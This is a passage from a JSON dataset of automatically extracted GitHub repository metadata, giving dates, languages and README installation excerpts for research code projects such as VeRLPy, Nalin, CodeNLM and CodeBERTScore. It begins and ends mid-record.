        "date_created": [
            {
                "result": {
                    "value": "2023-10-15T06:37:57Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-20T13:53:43Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 613660
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 17952
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "336": {
        "filename": "aebeljs_VeRLPy_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/aebeljs/VeRLPy",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "The easiest way to start using VeRLPy is to install it using `pip install verlpy`\n\nVeRLPy is currently dependent on OpenAI [Gym](https://gym.openai.com/), [cocotb](https://docs.cocotb.org/en/stable/), [cocotb-bus](https://github.com/cocotb/cocotb-bus), and [Stable Baselines3](https://stable-baselines3.readthedocs.io/en/master/). These packages should get installed alongside VeRLPy when installing using `pip`. For running the verification, a simulator compatible with cocotb is additionally required. Please refer to the official  [cocotb](https://docs.cocotb.org/en/stable/) documentation to set this up.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "VeRLPy"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/aebeljs/VeRLPy/main/README.md"
            },
            {
                "result": {
                    "value": "Having familiarity with [cocotb](https://docs.cocotb.org/en/stable/), OpenAI [Gym](https://gym.openai.com/) and [this whitepaper on VeRLPy](https://arxiv.org/abs/2108.03978) will be very beneficial to get started with the VeRLPy library.\n\nThe hardware design provided in Verilog or VHDL is simulated by cocotb using the chosen simulator. VeRLPy aims to offer a clean interface for bringing RL logic into the conventional cocotb testbench while adhering to the OpenAI Gym environment structure allowing users to leverage the standard RL tools. The DUT and the verification testbench are the environment for the RL agent to act on. The agent chooses an action which is executed on the environment and the consequences of that action are informed back to the agent in terms of the state and the reward. \n",
                    "type": "Text_excerpt",
                    "original_header": "Usage Guide",
                    "parent_header": [
                        "VeRLPy"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/aebeljs/VeRLPy/main/README.md"
            },
            {
                "result": {
                    "value": "To build a testbench using VeRLPy, we need to start by defining the verification goals in terms of functional coverage. This involves identifying the events occurring in the DUT that correspond to the features that are part of the design specifications. The reward given to the RL agent will be a function of how often these events occur during the simulation.\n\nIn addition, since there is the additional RL component involved, the MDP has to be defined. This means identifying what each timestep and each episode corresponds to in terms of verification logic and input stimulus to the DUT, and what the state and the action space of the MDP represent. \n\nEach RL episode starts with a call to to the `reset()` function of the Gym environment. Followed by this, there are one or more calls to the `step(action)` function until `done` is returned with a value of `True` from the RL environment.  Refer to [Gym](https://gym.openai.com/) for a more detailed understanding of how the control flow occurs in a Gym environment. \n",
                    "type": "Text_excerpt",
                    "original_header": "Identifying verification goals and defining the MDP",
                    "parent_header": [
                        "VeRLPy",
                        "Usage Guide"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/aebeljs/VeRLPy/main/README.md"
            },
            {
                "result": {
                    "value": "The library provides a Gym environment object `CocotbEnv` which can be inherited to build the verification testbench. This class has predefined functions/coroutines which interact with the RL agent to facilitate the learning process. These functions are triggered by the `reset()`, `step(action)`, `done` variable, etc. Please refer [here](https://github.com/aebeljs/VeRLPy/blob/main/src/cocotb_env.py) for more detailed explanations of these functions and their implementation details. We start with implementing this class that inherits `CocotbEnv`. \n\n```python\n# test_my_example_design.py\n\nimport cocotb\nfrom verlpy import CocotbEnv\n\nclass MyExampleDesignCocotbEnv(CocotbEnv):\n    def __init__(self, dut, observation_space):\n        super().__init__()\n        self.dut = dut # DUT object used for cocotb-based verification\n        self.observation_space = observation_space # state space of the RL agent\n\n        # add here any \"self.\" variables that need to be accessed in\n        # other functions below\n\n    @cocotb.coroutine\n    def setup_rl_episode(self):\n        # add here the logic to be \n        # executed on each call to reset() by the RL agent\n\n    @cocotb.coroutine\n    def rl_step(self):\n        # add here the verification logic to be \n        # executed on each call to step() by the RL agent\n        \n\n    @cocotb.coroutine\n    def terminate_rl_episode(self):\n        # add here the logic to be executed at the end\n        # of each RL episode when done == 1 for the Gym env\n\n\n    def finish_experiment(self):\n        # add here the logic to be executed after all\n        # the episodes are completed\n```\nNote that all the coroutines with the decorator `cocotb.coroutine` require a `yield` statement in the body like how it is in standard cocotb testbenches.\n",
                    "type": "Text_excerpt",
                    "original_header": "Inheriting CocotbEnv",
                    "parent_header": [
                        "VeRLPy",
                        "Usage Guide"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/aebeljs/VeRLPy/main/README.md"
            },
            {
                "result": {
                    "value": "The functions/coroutine implementations defined in `MyExampleDesignCocotbEnv` should contain the appropriate logic that must run from the cocotb side. Once this class is defined, the cocotb test can be added to invoke the verification logic from this class. While defining this, the state space of the MDP should also be passed as an argument as shown below.\n\n```python\n# test_my_example_design.py\n\nimport cocotb\nfrom verlpy import CocotbEnv, utils\nimport gym\n\nclass MyExampleDesignCocotbEnv(CocotbEnv):\n    def __init__(self, dut, observation_space):\n        super().__init__()\n        self.dut = dut\n        self.observation_space = observation_space\n\n        # add here any \"self.\" variables that need to be accessed in\n        # other functions below\n\n    @cocotb.coroutine\n    def setup_rl_episode(self):\n        # add here the logic to be \n        # executed on each call to reset() by the RL agent\n\n    @cocotb.coroutine\n    def rl_step(self):\n        # add here the verification logic to be \n        # executed on each call to step() by the RL agent\n        \n\n    @cocotb.coroutine\n    def terminate_rl_episode(self):\n        # add here the logic to be executed at the end\n        # of each RL episode when done == 1 for the Gym env\n\n\n    def finish_experiment(self):\n        # add here the logic to be executed after all\n        # the episodes are completed\n\n# entry point for the cocotb verification test\n@cocotb.test()\ndef run_test(dut):\n    cocotb_env = MyExampleDesignCocotbEnv(dut, gym.spaces.Discrete(1))\n    # gym.spaces.Discrete(1) => Just 1 state in the state space\n    yield cocotb_env.run()\n\n    # plot the results of the verification experiment\n    utils.visualize(cocotb_env.log_file_name)\n```\n\nVeRLPy also provides some plotting capabilities which can be accessed from `utils` as shown above.\n",
                    "type": "Text_excerpt",
                    "original_header": "Instantiating the verification environment object",
                    "parent_header": [
                        "VeRLPy",
                        "Usage Guide"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/aebeljs/VeRLPy/main/README.md"
            },
            {
                "result": {
                    "value": "The identified functional coverage events can be tracked by using cocotb coroutines like in conventional cocotb-based verification.\n\n```python\n# test_my_example_design.py\n\nimport cocotb\nfrom verlpy import CocotbEnv, utils\nimport gym\n\nclass MyExampleDesignCocotbEnv(CocotbEnv):\n    def __init__(self, dut, observation_space):\n        super().__init__()\n        self.dut = dut\n        self.observation_space = observation_space\n\n        # add here any \"self.\" variables that need to be accessed in\n        # other functions below\n\n    @cocotb.coroutine\n    def setup_rl_episode(self):\n        # add here the logic to be \n        # executed on each call to reset() by the RL agent\n        self.cocotb_coverage.clear() # clear last episode's coverage\n        self.coverage_coroutine = cocotb.fork(monitor_signals(self.dut, self.cocotb_coverage))\n\n    @cocotb.coroutine\n    def rl_step(self):\n        # add here the verification logic to be \n        # executed on each call to step() by the RL agent\n        \n\n    @cocotb.coroutine\n    def terminate_rl_episode(self):\n        # add here the logic to be executed at the end\n        # of each RL episode when done == 1 for the Gym env\n\n        self.coverage_coroutine.kill()\n\n\n    def finish_experiment(self):\n        # add here the logic to be executed after all\n        # the episodes are completed\n\n@cocotb.coroutine\ndef monitor_signals(dut, cocotb_coverage):\n    while True:\n        yield RisingEdge(dut.CLK)\n        s = [(int)(dut.reg_1.value == 1),\n             (int)((dut.reg_2.value) % 4 != 0),\n             (int)(dut.reg_3.value == 32)]\n        # Here reg_1, reg_2 and reg_3 are some\n        # key registers of interest in the DUT\n\n        s = ''.join(map(str, s))\n        cocotb_coverage.append(s)\n\n# entry point for the cocotb verification test\n@cocotb.test()\ndef run_test(dut):\n    cocotb_env = MyExampleDesignCocotbEnv(dut, gym.spaces.Discrete(1))\n    # gym.spaces.Discrete(1) => Just 1 state in the state space\n    yield cocotb_env.run()\n\n    # plot the results of the verification experiment\n    utils.visualize(cocotb_env.log_file_name)\n```\nThe `monitor_signals` coroutine added above monitors the DUT for events of interest that count towards the functional coverage. The  boolean logical expressions in the list `s` above correspond to the logical expressions for identifying each event. The number of times these events occur affect the reward signal given to the RL agent. `monitor_signals` should track these events and add them to the `cocotb_coverage` attribute of the `MyExampleDesignCocotbEnv` class that we wrote. `monitor_signals` is invoked in the `setup_rl_episode` coroutine along with the clock and reset coroutines. It is passed the `cocotb_coverage` attribute as an argument. Note that `monitor_signals` is killed in the `terminate_rl_episode` coroutine at the end of each RL episode. This is important for all coroutines since it might otherwise lead to performance issues with multiple \"alive\" coroutines still ongoing from previous episodes.\n",
                    "type": "Text_excerpt",
                    "original_header": "Adding coroutines to track events",
                    "parent_header": [
                        "VeRLPy",
                        "Usage Guide"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/aebeljs/VeRLPy/main/README.md"
            },
            {
                "result": {
                    "value": "A configuration file `config.ini` needs to be provided to specify the parameters related to the simulation and the RL agent. A sample coniguration file is provided below with comments for what each section and key corresponds to.\n\n```ini\n; This section is to provide the\n; main parameters for the verification runs\n[main]\n; number of RL steps for which the experiment is run\nnum_steps = 1000\n\n; number of functional events tracked\nnum_events = 3\n\n; weightage of each functional event for reward computation\nreward_function = [0, 0, 1]\n\n; set log_step as 0 for logging just aggregated results and 1 for logging details in each step\nlog_step = 0\n\n; set mode as 0 to generate the random baseline without RL and 1 for using RL\nmode = 1\n\n; specify the stable_baselines3 algorithm to be used from SAC, DDPG and TD3\nalgorithm = SAC\n\n; fsm_states contains the regex patterns for \n; state-based binary sequence generation\n; (leave as [] unless utils.get_next_state_of_FSM() is needed in the code)\nfsm_states = []\n\n; Provide the discrete action component names here. \n; The valid dscrete value set for the specified keys\n; should be given in the [discrete] section\ndiscrete_params = ['count_width', 'fmap_len']\n\n\n; This section is to provide the bounds\n; of the continuous dimensions of the action space.\n; If multiple dimensions are there, provide the list of bounds for each dimension\n; eg: lower_bounds = [0, 0, 1] and upper_bounds = [1, 1, 3] corresponds to\n; [0, 1] x [0, 1] x [1, 3] as the continuous action space\n[continuous]\nlower_bounds = [0, 5]\nupper_bounds = [1, 7]\n\n\n; This section is to provide the list of valid \n; discrete values for each discrete action\n; component named in discrete_params\n[discrete]\ncount_width = [1, 2, 3, 4, 5, 6, 7, 8]\nfmap_len = [100, 200, 300, 400, 500, 600, 700, 800, 900, 1000]\n\n\n; This section is to provide the required\n; hyperparameters of the chosen stable_baselines3 algorithm\n[RL]\npolicy = 'MlpPolicy'\nlearning_starts = 100\nlearning_rate = 0.0003\ntrain_freq = (1, 'episode')\nverbose = 1\n```\nThe `reward_function` key specifies how the functional events tracked in the `self.cocotb_coverage` attribute need to be rewarded for improving coverage. `reward_function` set as `[0, 0, 1]` like above implies that if the third functional event occurs during a step, a reward is given to the RL agent. Refer to the [paper](https://arxiv.org/abs/2108.03978) for the actual computation details.\n\nThe `[continuous]` and `[discrete]` sections together specify the total action space of the RL agent. The continuous dimensions of the action space based on the above configuration file is the cross product `[0, 1] x [5, 7]`. The discrete dimensions of the the action space is the cross product `{1, 2, ..., 8} x {100, 200, ..., 1000}`. Therefore the complete action space is the cross product `[0, 1] x [5, 7] x {1, 2, ..., 8} x {100, 200, ..., 1000}`.\n",
                    "type": "Text_excerpt",
                    "original_header": "Configuration File",
                    "parent_header": [
                        "VeRLPy",
                        "Usage Guide"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/aebeljs/VeRLPy/main/README.md"
            },
            {
                "result": {
                    "value": "Finally, the body of each of the coroutines overriden in `MyExampleDesignCocotbEnv` need to be completed. The action suggested by the RL agent based on the `config.ini` can be accessed through the `self.continuous_actions` and `self.discrete_actions` attributes of the class. In the above example, `self.continuous_actions` will sample from `[0, 1] x [5, 7]` and `self.discrete_actions` will sample from `{1, 2, ..., 8} x {100, 200, ..., 1000}`.\n\nThe list `self.cocotb_coverage` needs to be updated with the strings corresponding to the covered events from the previous timestep of the RL episode for proper reward computation based on the reward function defined in the `config.ini` file. This update will happen on its own if `self.cocotb_coverage` is passed as the argument `cocotb_coverage` to the  `monitor_signals` coroutine defined above  Refer to the examples folder for more concrete examples on how this is done in various designs.\n",
                    "type": "Text_excerpt",
                    "original_header": "Filling in the verification logic",
                    "parent_header": [
                        "VeRLPy",
                        "Usage Guide"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/aebeljs/VeRLPy/main/README.md"
            },
            {
                "result": {
                    "value": "VeRLPy by default assumes a single step single state MDP. If a multi-step MDP is required, it can be implemented by overriding `compute_rl_observation` function in the `MyExampleDesignCocotbEnv` class. The internal elements of the DUT that need to be tracked for computing the observation/state after each step can be done so by utilizing a separate coroutine like how `monitor_signals` is used for tracking the coverage to compute the reward.\n",
                    "type": "Text_excerpt",
                    "original_header": "Multi-step RL",
                    "parent_header": [
                        "VeRLPy",
                        "Usage Guide"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/aebeljs/VeRLPy/main/README.md"
            },
            {
                "result": {
                    "value": "The make file can be written like how it is done usually in cocotb testbenches. Once it is done and `make` is run, the verification simulation runs and the logs, models and plots are generated. Use the `mode` configuration parameter in `config.ini` for running the verification with/without the RL feedback.\n",
                    "type": "Text_excerpt",
                    "original_header": "Make file",
                    "parent_header": [
                        "VeRLPy",
                        "Usage Guide"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/aebeljs/VeRLPy/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-11-08T11:14:05Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-20T02:30:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 25581
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "337": {
        "filename": "sola-st_Nalin_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/sola-st/Nalin",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "#### Python Packages\n\nThe required packages are listed in _requirements.txt_. The packages may be installed using the command ```pip install -r requirements.txt```. \nAdditionally, install the [PyTorch](https://pytorch.org/get-started/locally/) package (We have tested on PyTorch version 1.10.1).  \n\n```shell\npip install -r requirements.txt\npip install torch==1.10.1+cpu torchvision==0.11.2+cpu torchaudio==0.10.1+cpu -f https://download.pytorch.org/whl/cpu/torch_stable.html\n```\n\n\ud83d\udca1 The above command will install the **CPU** version of PyTorch. If you want CUDA support, please change the command accordingly as mentioned in the [link](https://pytorch.org/get-started/locally).\n\n#### Jupyter Notebook Dataset\n\nWe use the dataset from a CHI\u201918 [paper](https://dl.acm.org/doi/10.1145/3173574.3173606) that has analyzed more than 1.3 million publicly available Jupyter \nNotebooks from GitHub. Download the dataset using the [link](https://library.ucsd.edu/dc/collection/bb6931851t).\nWe provide a sample of about 2000 Jupyter notebooks (_benchmark/jupyter_notebook_datasets/sample.zip_) obtained from this dataset for testing. \n\n#### Embedding\n\nDownload the embedding file from the [link](https://u.pcloud.link/publink/show?code=XZyeJaXZrnrbvwzBcYSOWYgzsn4usJ6DOqPy) and put in the _benchmark_ folder.\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/sola-st/Nalin/main/INSTALL.md"
            },
            {
                "result": {
                    "value": "\ud83d\udccc\nWe have tested using Ubuntu 18.04 LTS and Python 3.8.12. Additionally, we use a Docker \ncontainer to run dynamic analysis which also needs to be installed. \n",
                    "type": "Text_excerpt",
                    "original_header": "Requirements &amp; Setup"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/sola-st/Nalin/main/README.md"
            },
            {
                "result": {
                    "value": "The directory structure is as follows:\n\n```shell\nsrc/ # The root directory of all source files\nbenchmark/ # This may contain the input Python files & the Jupyter Notebooks\ndynamic_analysis_runner/ # Code for running Dynamic Analysis\nsrc/dynamic_analysis_tracker_local_package/ # Python package for saving the assignments encountered during execution\nsrc/get_scripts_and_instrument/ # Code for getting Jupyter Notebooks, converting them to Python scripts and instrumenting\nsrc/nn/ # Code for running the Classifier\nresults/ # The results generated by running the experiments are written here\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Directory Structure",
                    "parent_header": [
                        "Requirements &amp; Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/sola-st/Nalin/main/README.md"
            },
            {
                "result": {
                    "value": "The required packages are listed in _requirements.txt_. The packages may be installed using the command ```pip install -r requirements.txt```. \nAdditionally, install the [PyTorch](https://pytorch.org/get-started/locally/) package (We have tested on PyTorch version 1.10.1).  \n\n\ud83d\udccc\n```shell\npip install -r requirements.txt\npip install torch==1.10.1+cpu torchvision==0.11.2+cpu torchaudio==0.10.1+cpu -f https://download.pytorch.org/whl/cpu/torch_stable.html\n```\n\n\ud83d\udca1 The above command will install the **CPU** version of PyTorch. If you want CUDA support, please change the command accordingly as mentioned in the [link](https://pytorch.org/get-started/locally).\n",
                    "type": "Text_excerpt",
                    "original_header": "Python Packages",
                    "parent_header": [
                        "Requirements &amp; Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/sola-st/Nalin/main/README.md"
            },
            {
                "result": {
                    "value": "We use the dataset from a CHI\u201918 [paper](https://dl.acm.org/doi/10.1145/3173574.3173606) that has analyzed more than 1.3 million publicly available Jupyter \nNotebooks from GitHub. Download the dataset using the [link](https://library.ucsd.edu/dc/collection/bb6931851t).\nWe provide a sample of about 2000 Jupyter notebooks (_benchmark/jupyter_notebook_datasets/sample.zip_) obtained from this dataset for testing (Download the sample from \nthe Zenodo [archive](https://zenodo.org/record/6078527)). \n",
                    "type": "Text_excerpt",
                    "original_header": "Jupyter Notebook Dataset",
                    "parent_header": [
                        "Requirements &amp; Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/sola-st/Nalin/main/README.md"
            },
            {
                "result": {
                    "value": "\ud83d\udccc\nDownload the embedding file present at _benchmark/python_embeddings.bin_ from the Zenodo [archive](https://zenodo.org/record/6078527) and put in the _benchmark_ folder.\n\n---\n",
                    "type": "Text_excerpt",
                    "original_header": "Embedding",
                    "parent_header": [
                        "Requirements &amp; Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/sola-st/Nalin/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Simply run or follow the \ud83d\udccc marked instructions from the root directory of this repository. \n \n",
                    "original_header": "TL;DR \ud83e\ude9c"
                },
                "confidence": 0.9994997770758726,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sola-st/Nalin/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Run the following command from the root folder. \n\ud83d\udccc\n```bash\npython src/get_scripts_and_instrument/run_get_scripts_and_instrument.py\n``` \nBy default, this script should: \n1) Extract the Jupyter notebooks present in '_benchmark/jupyter_notebook_datasets/sample.zip_' to '_benchmark/python_scripts_'\n2) Convert the extracted notebooks to Python script \n3) Delete the extracted notebooks\n4) Instrument the converted Python scripts \nNot all Jupyter Notebooks present in _sample.zip_ get instrumented. Some encounter errors while conversion to Python\nscripts and some during instrumentation. \n \n",
                    "original_header": "Instrument Python files for tracking assignments"
                },
                "confidence": 0.9881671002324744,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sola-st/Nalin/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "All experiments using the classifier is run using the command ```python src/nn/run_classification.py```.\n \n",
                    "original_header": "2. Classifier \ud83e\udd9e"
                },
                "confidence": 0.9958202355966442,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sola-st/Nalin/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-03-08T12:57:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-02T21:39:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 141241
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 110467
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1211
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "338": {
        "filename": "soarsmu_CodeNLM_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/soarsmu/CodeNLM",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "```\n# Python==3.6 is required, Python>3.6 may not supported due to the tensorflow version.\npip install numpy==1.18.1 \npip install tensorflow-gpu==1.12.3\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Usage"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/soarsmu/CodeNLM/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Thanks for the open-source code from https://github.com/mast-group/OpenVocabCodeNLM.git. \n",
                    "original_header": "Misc"
                },
                "confidence": 0.9998498662251822,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/soarsmu/CodeNLM/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-09-24T03:38:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-05-06T02:28:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 60939
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 7143
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "339": {
        "filename": "psg-mit_programming-with-neural-surrogates-of-programs_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/psg-mit/programming-with-neural-surrogates-of-programs",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-12-12T03:02:30Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-18T19:34:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 32689
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 207
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "340": {
        "filename": "neulab_code-bert-score_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/neulab/code-bert-score",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "_**April 2023**_ - CodeBERTScore is now available on [pypi](https://pypi.org/project/code-bert-score/), which means that you can simply `pip install code-bert-score`! \n",
                    "original_header": "CodeBERTScore"
                },
                "confidence": 0.999993498426168,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/neulab/code-bert-score/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-09-18T16:40:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-01T14:58:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 382467
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 133230
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1415
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "341": {
        "filename": "aciborowska_jingo_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/aciborowska/jingo",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-04-15T22:19:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-12-21T00:59:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 130098
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "342": {
        "filename": "wq2012_SpeakerVerSim_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/wq2012/SpeakerVerSim",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "The `SpeakerVerSim` library can be installed with:\n\n```\npip install SpeakerVerSim\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Install",
                    "parent_header": [
                        "SpeakerVerSim <a href=\"https://github.com/wq2012/SpeakerVerSim/actions/workflows/python-app.yml\"><img alt=\"Python application\" src=\"https://github.com/wq2012/SpeakerVerSim/actions/workflows/python-app.yml/badge.svg\" /></a> <a href=\"https://pypi.python.org/pypi/SpeakerVerSim\"><img alt=\"PyPI Version\" src=\"https://img.shields.io/pypi/v/SpeakerVerSim.svg\" /></a> <a href=\"https://pypi.org/project/SpeakerVerSim\"><img alt=\"Python Versions\" src=\"https://img.shields.io/pypi/pyversions/SpeakerVerSim.svg\" /></a> <a href=\"https://pepy.tech/project/SpeakerVerSim\"><img alt=\"Downloads\" src=\"https://static.pepy.tech/badge/SpeakerVerSim\" /></a>",
                        "How to use"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/wq2012/SpeakerVerSim/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "| Script                          | Strategy    | Description |\n| ------------------------------- | ----------- | ----------- |\n| `server_single_simple.py`       | SSO         | Basic server-side single version online updating strategy.\n| `server_single_sync.py`         | SSO-sync    | Server-side single version online updating strategy with frontend-worker version sync.\n| `server_single_hash.py`         | SSO-hash    | Server-side single version online updating strategy with user-ID hashing.\n| `server_single_multiprofile.py` | SSO-mul     | Server-side single version online updating strategy with multi-profile database.\n| `server_single_sync.py`         | SD          | Server-side double version updating strategy.\n \n",
                    "original_header": "List of implemented strategies"
                },
                "confidence": 0.998803715985895,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/wq2012/SpeakerVerSim/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-06-27T20:33:42Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-25T15:37:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 55863
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 497
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "343": {
        "filename": "KKZ20_DECIDE_2024-10-04.json",
        "code_repository": [
            {
                "result": {
